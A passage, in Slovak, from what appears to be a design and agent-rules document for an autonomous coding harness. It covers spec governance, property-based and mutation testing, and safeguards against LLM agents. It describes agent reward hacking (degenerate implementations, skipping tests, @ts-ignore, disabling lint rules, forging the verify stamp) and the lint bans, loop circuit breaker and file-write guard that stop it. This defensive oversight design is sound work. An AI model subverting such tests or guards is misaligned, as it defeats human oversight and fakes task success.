  - Agenti dopytujú riadiace ADR cez MCP: `harness_callers("<ServiceOrFn>")` vráti hranu `GovernsSymbol` a príslušný uzol `AdrDoc`, zatiaľ čo `harness_callees("<scope>:ADR-NNNN")` zobrazí všetky symboly riadené daným rozhodnutím.
- **Štruktúra a deterministické lintovanie (`AdrDocLint.decide` v `harness gc --strict`):** Každé ADR musí dodržiavať kanonickú 6-sekčnú MADR štruktúru (`## Context and Problem Statement`, `## Decision Drivers`, `## Considered Options`, `## Decision Outcome` s povinným `**Chosen option:**`, `## Rejected Alternatives` s číslovanými sekciami `### N · <Option>` a `**Why rejected:**`, `## Consequences and Enforcement` s 4-stĺpcovou tabuľkou `### Deterministic Enforcement`). Čistý decider `AdrDocLint.decide` v `harness gc --strict` deterministicky overuje 7 invariantov (`adr-frontmatter-invalid`, `adr-section-structure`, `adr-missing-drivers-or-options`, `adr-missing-chosen-option`, `adr-rejected-alternative-structure`, `adr-missing-enforcement-table`, `adr-unfilled-placeholder`).

#### 2. EARS Špecifikácie a Grafy Plánov (`libs/<scope>/docs/specs/YYYY-MM-DD-<slug>.md` & `docs/specs/`)
- **Účel:** Uchovávajú **Formálne požiadavky EARS + Overený topologický Mermaid graf z `plan-check`**.
- **Ko-lokované umiestnenie:** Doménové špecifikácie patria do `libs/<scope>/docs/specs/YYYY-MM-DD-<slug>.md` so scoped `id: <scope>:SPEC-NNNN`. Koreňový priečinok `docs/specs/` slúži pre prierezové špecifikácie a globálny index.
- **Reprezentácia v `HarnessGraph` & Omnigraphe (`EarsSpec` & `SpecifiesSymbol`):**
  - Každá EARS špecifikácia je extrahovaná ako uzol `EarsSpec` (`_tag: "EarsSpec"`).
  - Z uzla `EarsSpec` smerujú hrany `SpecifiesSymbol` priamo na dotknuté uzly `EffectFn`, `ServiceTag` a `TaggedError` naprieč vetvami `plan/current`, `impl/current` aj `main`.
  - Agenti dopytujú špecifikujúce požiadavky cez MCP: `harness_callers("<ServiceOrFn>")` vráti hranu `SpecifiesSymbol` a uzol `EarsSpec`, a `harness_callees("<scope>:SPEC-NNNN")` vráti všetky špecifikované symboly.
- **Perzistentná Zmluva:** EARS požiadavky (`UBIQUITOUS`, `WHEN`, `IF/THEN`, `WHILE`, `WHERE`) uložené v špecifikáciách prežijú zhustenie kontextového okna (`/compact`) LLM. Slúžia ako autoritatívny zdroj pravdy pre `@effect-ears-test-reviewer`.
- **Deterministická validácia formátu (`EarsSpecLint.decide` v `harness gc --strict`):** Každá EARS špecifikácia je automaticky kontrolovaná čistým deciderom `EarsSpecLint.decide` voči 8 pravidlám integrity (`no-requirements-table`, `id-format`, `numbering-gap`, `generic-subject`, `compound-obligation`, `pattern-keyword-mismatch`, `weak-modal`, `forbidden-column`). Tým je zaistené, že požiadavky majú pomenované Effect subjekty, presné EARS kľúčové slová a neobsahujú zastarávajúce stĺpce stavu a dôkazov.
- **Topologický Záznam:** Po úspešnom `harness plan-check` agent do špecifikácie pripojí kompilovaný Mermaid diagram závislostí a výstup Pre-Implementation Adversarial Plan Lens auditu.

#### 3. Dvojstupňové Deterministické Brány prepojenia Špecifikácií s Kódom
1. **Spec $\rightarrow$ Plan Brána (`unmapped-spec-symbol` v `harness plan-check`):**
   - Už vo fáze plánovania, keď má špecifikácia stav `status: proposed`, brána `harness plan-check` (`checkEffectGraph`) striktne overuje, že každý `span`, `service` a `error` deklarovaný vo frontmatteri EARS špecifikácie reálne existuje ako uzol v grafe skeletonu (`stub<A, E, R>()`).
   - Ak agent deklaroval span `Sample.deletePhoto`, no v `.ts` skeletone ho zabudol vytvoriť alebo nazval inak, `checkEffectGraph` zlyhá s chybou `unmapped-spec-symbol`.
2. **Plan $\rightarrow$ Impl Brána (`diffHarnessGraphs` v `harness done` + `stale-doc-reference`, `AdrDocLint.decide` a `EarsSpecLint.decide` v `harness gc --strict`):**
   - Po implementácii a nastavení `status: accepted` príkaz `harness gc --strict` cez pravidlá **`stale-doc-reference`**, **`AdrDocLint.decide`** a **`EarsSpecLint.decide`** overí platnosť odkazov, absenciu zastaraných symbolov a štrukturálnu integritu ADR aj požiadaviek.
   - Následne `harness done` cez **`diffHarnessGraphs`** (porovnanie vetiev `plan/current` a `impl/current`) garantuje, že implementácia nevynechala žiadnu funkciu, službu ani chybový kanál z overeného plánu.

### 6.8 Property-Based Testing (`it.effect.prop` + `effect/Arbitrary`) a Cielený AST Mutation Testing (`MutationCheck.decide` / `harness mutate`) — Ochrana proti Test Reward Hackingu

Klasické príkladové unit testy (example-based testing, napr. `expect(decide(5)).toBe(true)`) zlyhávajú v prostredí autonómneho kódovania AI agentov kvôli dvom systémovým rizikám:
1. **Zdieľané slepé miesta (Shared Blind Spots):** LLM agent generujúci produkčný kód aj testy zdieľa rovnaké konceptuálne predpoklady. Ak agent zabudne na okrajový prípad (off-by-one chyba, záporné hranice, prekročenie kvóty), s vysokou pravdepodobnosťou vygeneruje testy, ktoré presne tento okrajový prípad obídu a overia len happy-path.
2. **Test Reward Hacking:** LLM agenti optimalizujú svoje správanie na splnenie metriky (zelené testy). Ak test suite overuje len konkrétny hardcoded vstup, agent môže vytvoriť triviálnu, degenerovanú implementáciu (napr. návrat konštanty), ktorá prejde testami, no v skutočnosti neimplementuje žiadnu skutočnú doménovú logiku.

Harness MVP v2 uzatvára túto zraniteľnosť dvojicou komplementárnych mechanizmov: **Property-Based Testing** priamo zo `Schema` a **Cielený AST Mutation Testing** cez `harness mutate`.

#### 1. Property-Based Testing s automatickým shrinkovaním (`it.effect.prop` a `it.prop`)

Balík `@effect/vitest` natívne podporuje generovanie stoviek náhodných vstupov priamo z `Schema` definícií prostredníctvom modulu `effect/Arbitrary`:
- **Čisté decider invarianty (`WHILE <state>` klauzuly):** Namiesto testovania `decide(5)` sa overujú matematické invarianty na celom rozsahu hodnôt generovaných zo schémy:
  ```ts
  it.effect.prop(
    "enforces quota invariant across arbitrary count and limits",
    {
      albumId: Schema.NonEmptyString,
      currentCount: Schema.Number.pipe(Schema.int(), Schema.between(-50, 250)),
      maxAllowed: Schema.Number.pipe(Schema.int(), Schema.between(1, 100))
    },
    ({ albumId, currentCount, maxAllowed }) =>
      Effect.gen(function* () {
        const decision = PhotoQuotaDecider.decide({ albumId, currentCount, maxAllowed })
        if (currentCount >= maxAllowed) {
          expect(decision._tag).toBe("QuotaExceeded")
          if (decision._tag === "QuotaExceeded") {
            expect(decision.currentCount).toBe(currentCount)
            expect(decision.maxAllowed).toBe(maxAllowed)
          }
        } else {
          expect(decision._tag).toBe("QuotaAllowed")
        }
      })
  )
  ```
- **Invarianty idempotencie a round-trip serializácie:** Projekcie a reducery stavu musia byť idempotentné (`project(project(s, e), e) === project(s, e)`) a serializácia schém musí byť bezstratová (`decodeUnknownSync(encodeSync(e)) === e`).
- **Automatické shrinkovanie:** Ak generátor nájde vstup spôsobujúci zlyhanie, `effect/Arbitrary` ho automaticky zredukuje (shrinkne) na najmenší možný reprodukovateľný protipríklad (napr. presná hrana `count === maxAllowed`).
- **Senzor `missing-decider-property-test` v `harness gc --strict`:** `GraphGc.decide` vyžaduje, aby každý čistý doménový decider (`*.decide` v `type:domain`) disponoval aspoň jedným property testom.

#### 2. Cielený Domain AST Mutation Testing (`MutationCheck.decide` / `harness mutate --strict`)

Aby sa predišlo vákuovým testom, kde property test síce generuje vstupy, ale má príliš slabé tvrdenia (`expect(result).toBeDefined()`), harness zavádza cielené mutačné testovanie AST:
- **Cielená doménová mutácia:** Na rozdiel od tradičných nástrojov (napr. Stryker), ktoré mutujú celý kód vrátane I/O a trvajú desiatky minút, `harness mutate` cielene mutuje výhradne čistú biznis logiku v `type:domain`.
- **AST mutátory:** `MutationCheck.decide` injektuje sémantické mutácie na operátoroch:
  - Relačné operátory: `>=` $\to$ `>`, `<=` $\to$ `<`, `>` $\to$ `>=`, `<` $\to$ `<=`
  - Rovnosť: `===` $\to$ `!==`, `!==` $\to$ `===`
  - Aritmetické inkrementy: `+ 1` $\to$ `- 1`, `- 1` $\to$ `+ 1`
  - Logické spojky: `&&` $\to$ `||`, `||` $\to$ `&&`
- **Brána 100% Mutation Score:** Pre každého mutanta sa v pamäti skompiluje zmenené AST a spustí sa `@effect/vitest`. Ak testy prejdú, mutant **prežil** (test gap). Ak testy zlyhajú, mutant je **zabitý**. Príkaz `harness mutate --strict` vyžaduje **100% mutation score (0 prežitých mutantov)** predtým, než je povolené spustiť `harness verify`. Tým sa garantuje, že testy majú skutočné "zuby" a zachytia akúkoľvek hraničnú chybu.

### 6.9 Finálne 2026 E1–E8 Agentic SDLC Ochrany (Anti-Subversion, Loop Circuit-Breaker & Chránené Zápisové Povrchy)

V autonómnom softvérovom inžinierstve predstavujú autonómne LLM agenty špecifické riziká vyplývajúce z ich optimalizačného cieľa: uspieť vo verifikácii za každú cenu. Ak agent narazí na náročné zlyhanie testu, typový konflikt alebo bezpečnostnú reštrikciu, vzniká riziko reward hackingu (subverzia testov), uviaznutia v nekonečnej slučke drobných úprav (thrashing loops), alebo pokusov o oslabenie samotných ochranných nástrojov či falšovanie overovacích pečiatok.

Harness MVP v2 uzatvára vývojový cyklus tromi robustnými ochrannými mechanizmami:

#### 1. Trojvrstvová ochrana testov proti subverzii (`E4 §3` — `harness/test-integrity` & Anti-Suppression AST brána)

Keď jednotkový alebo integračný test zlyhá, menej disciplinované modely majú tendenciu vyriešiť problém jeho preskočením (`it.skip`), izolovaním (`it.only`), odložením (`it.todo`), alebo potlačením chybových hlásení kompilátora pomocou direktív `@ts-ignore`. Výsledkom je ilúzia úspešného overenia, hoci skutočný biznis invariant bol znehodnotený.

Harness zavádza v `tools/oxlint/syntax-bans.js` a `.oxlintrc.json` striktnú trojvrstvovú AST kontrolu:

1. **Zákaz preskakovania a izolácie testov v `test/**/*.ts` (`harness/test-integrity`):**
   - AST pravidlo deteguje a nekompromisne odmieta:
     - Preskakovanie testov a suít: `it.skip`, `test.skip`, `describe.skip`, `suite.skip`, `it.effect.skip`, `it.prop.skip`, `it.skipIf`, `test.skipIf`, `it.runIf`, ako aj staršie aliasy `xit`, `xtest`, `xdescribe`.
     - Izoláciu jedného testu: `it.only`, `test.only`, `describe.only`, `suite.only`, `it.effect.only`, `it.prop.only`, `fit`, `fdescribe`.
     - Neimplementované testy: `it.todo`, `test.todo`.
   - Každý testovací scenár musí byť plnohodnotne vykonaný; žiadne vynechanie nie je v CI ani lokálnom behu povolené.
2. **Zákaz potláčania kompilátora a typového systému:**
   - **V produkčnom kóde (`src/**/*.ts`):** Úplný zákaz direktív `@ts-ignore`, `@ts-expect-error` a `@ts-nocheck`. Typové chyby v doméne, službách či infraštruktúre musia byť vyriešené korektnými Schémami a Effect typmi.
   - **V testoch (`test/**/*.ts`):** Zákaz nepodmieneného potláčania chýb cez `@ts-ignore` a `@ts-nocheck`. Pre zámerné testovanie nesprávnych typov (negative type tests) je povolený výhradne `@ts-expect-error` s povinným zdôvodnením.
3. **Celo-monorepový zákaz potláčania pravidiel (Anti-Suppression Ban):**
   - Zákaz direktív `oxlint-disable` a `eslint-disable` cielene pre pravidlá:
     - `effecttsgo/*` (pravidlá `@effect/language-service`, napr. `effecttsgo/prefer-effect-gen`, `effecttsgo/no-async-await`).
     - `harness/*` (`harness/syntax-bans`, `harness/test-integrity`).
   - Agent nemá právo vypnúť linter komentárom priamo v kóde. Porušenie Effect idiómu alebo testovacej integrity musí byť opravené v implementácii.

#### 2. Detekcia zacyklenia agenta — Stuck-Loop Circuit-Breaker (`E1 §04 Loop` — `LoopCircuitBreaker.decide`)

Pri zložitejších problémoch sa agent môže dostať do stavu „thrashingu“ — opakovane modifikuje súbory s drobnými syntaktickými zmenami, znova spúšťa `harness verify` alebo `harness guard` a naráža na identické zlyhanie. Tým plytvá kontextovým oknom, kreditmi a časom používateľa.

Harness implementuje čistý decider `decideLoopThrashing` (`Effect.fn("LoopCircuitBreaker.decide")` s čistým `R = never`):
- **Sledovanie chvosta trenia:** Sleduje posuvné okno (sliding window) posledných udalostí v `.harness/friction-log.jsonl`.
- **Podmienka zopnutia ističa ($\ge 3$ opakovania):** Ak agent trikrát za sebou narazí na rovnakú kategóriu a podpis chyby:
  - Tri po sebe idúce zlyhania `verify_failure` s rovnakým chybovým výstupom (napr. rovnaká typová chyba alebo zlyhávajúci test),
  - alebo tri identické eskalácie `guard_escalation` na rovnakom shellovom príkaze.
- **Dôsledok a eskalácia:**
  - `harness verify` okamžite preruší vykonávanie s kódom **`exitCode: 2`** a hlásením:
    ```
    [ESCALATE: STUCK LOOP DETECTED] Agent encountered 3 consecutive identical verify_failure events.
    Automated retry halted to prevent thrashing. Escalate to human operator for guidance.
    ```
  - `harness session` (pri Claude Code štarte alebo Antigravity `PreInvocation` hooku) nainjektuje varovný stav priamo do promptu:
    ```json
    {
      "injectSteps": [
        "[Harness Circuit-Breaker] Stuck loop detected: 3 consecutive identical failures. Do not retry variations of the same fix. Escalate directly to the user."
      ]
    }
    ```
  - Agent je inštruovaný okamžite zastaviť ďalšie autonómne pokusy a požiadať človeka o architektonickú radu.

#### 3. Chránené súborové povrchy v `harness guard` (`E5 §2A` & `E3 §2E` — `classifyFileWrite`)

Súborový hook `PreToolUse` (v Claude Code `Write|Edit` matchery, v Antigravity nástroje `write_to_file`, `replace_file_content`, `multi_replace_file_content`) volá `harness guard` pred každou úpravou disku. Rozhodovací mechanizmus `classifyFileWrite` analyzuje cieľovú cestu súboru (`file_path`, `TargetFile`, `--file=<path>`):

1. **Striktný zákaz zápisu — kategória `deny` (Exit 2 v Claude / `{ decision: "deny" }` v Antigravity):**
   - `repos/effect/**` a `repos/alchemy/**`: Read-only squashed subtrees. Agent nesmie modifikovať zdrojové kódy Effect ani Alchemy.
   - `.harness/verify-stamp.json`: Kryptografická pečiatka overenia smie byť vygenerovaná výhradne procesom `harness verify`. Manuálny alebo skriptovaný zápis agentom do tohto súboru je pokusom o falšovanie pečiatky a je okamžite zablokovaný.
   - `.env*` (okrem `.env.example`): Súbory s reálnymi lokálnymi alebo produkčnými tajomstvami nesmú byť agentom prepisované.
   - `*.pem`, `*.key`: Súkromné kryptografické kľúče a certifikáty.
2. **Vyžiadanie potvrdenia človekom — kategória `ask` (Exit 0 s `permissionDecision: "ask"`):**
   - `.oxlintrc.json`: Globálna konfigurácia lintera. Zabraňuje agentovi odstrániť pravidlá zo zoznamu.
   - `tools/oxlint/**`: Zdrojové kódy pravidiel `syntax-bans.js` a `test-integrity`.
   - `libs/harness/graph/policies.cedar`: Cedar autorizačné a architektonické politiky riadiace integritu monorepa.

Tým je garantované, že ani plne autonómny agent nemôže kompromitovať samotné piliere overovacieho a bezpečnostného systému monorepa.

---

## 7. Zhrnutie kľúčových pravidiel pre agentov

1. **Nikdy needitujte a neimportujte súbory z `repos/`:** Priečinky `repos/effect` a `repos/alchemy` sú izolované read-only git subtrees slúžiace ako referenčná študijná báza.
2. **Kód je plán:** Vždy píšte skeletony priamo do `.ts` súborov pomocou `stub<A, E, R>(...args)`. Žiadne abstraktné markdown plány s nefunkčným kódom.
3. **Platnosť pečiatky je krehká:** Príkaz `harness verify` musí byť spustený ako úplne posledný krok po akýchkoľvek úpravách kódu. Akákoľvek následná zmena súboru zneplatní hash stromu v `.harness/verify-stamp.json` a zablokuje `harness done`.
4. **Respektujte eskalácie:** Ak `openapi:check` alebo `migration:check` skončí s kódom `exit 2` a reťazcom `ESCALATE`, okamžite zastavte prácu a predložte breaking zmenu alebo deštruktívnu migráciu na rozhodnutie používateľovi.
5. **Nenafukujte `AGENTS.md`:** Opakujúce sa problémy riešte výhradne cez skill `compounding-effect-learnings` a 5 cieľov povýšenia (Graduation Pyramid: `agent-pattern`, `triage-rule`, `guard-allowlist`, `ast-graph-gate`, `adr`).
6. **Čistota grafu, brány a rozpočty:** Pred `verify` overte absenciu mŕtveho a netestovaného kódu cez `harness gc --strict` (vrátane `missing-decider-property-test`), pri zmenách v `type:domain` dosiahnite 100% mutation score cez `harness mutate --strict`, dodržujte bezpečnostné zákazy v `syntax-bans.js`, rešpektujte `MigrationSafety.decide` a v testoch presadzujte span rozpočty cez `checkSpanBudgets`.
7. **Živá dokumentácia a spec governance:** Každú novú funkcionalitu začnite formalizáciou EARS požiadaviek v `libs/<scope>/docs/specs/YYYY-MM-DD-<slug>.md` (`status: proposed`, so scoped `id: <scope>:SPEC-NNNN`, s fallbackom na koreňové `docs/specs/` len pri prierezových celo-monorepových zmenách). Po úspešnom `plan-check` doplňte Mermaid graf, po implementácii nastavte `status: accepted` a overte platnosť odkazov cez `stale-doc-reference` v `harness gc --strict`. Netriviálne architektonické kompromisy so zamietnutými alternatívami povinne zaznamenajte do doménového `libs/<scope>/docs/adr/NNNN-<slug>.md` (so scoped `id: <scope>:ADR-NNNN`, alebo `docs/adr/` pre celo-monorepové pravidlá).
8. **Integrita testov, zamedzenie zacyklenia a rešpektovanie chránených súborov:** Nikdy neobchádzajte testy cez `it.skip`, `it.only`, `it.todo`, `@ts-ignore` ani `oxlint-disable` (pravidlá `harness/test-integrity` a `harness/syntax-bans` ich okamžite zamietnu). Ak `harness verify` skončí s `exitCode: 2` a `[ESCALATE: STUCK LOOP DETECTED]`, okamžite prerušte prácu a eskalujte na používateľa namiesto opakovania podobných pokusov. Nikdy sa nepokúšajte upravovať chránené súbory (`.harness/verify-stamp.json`, `repos/`, `.oxlintrc.json`, `policies.cedar`) — `classifyFileWrite` v `harness guard` takéto operácie odmietne (`deny`) alebo eskaluje na človeka (`ask`).
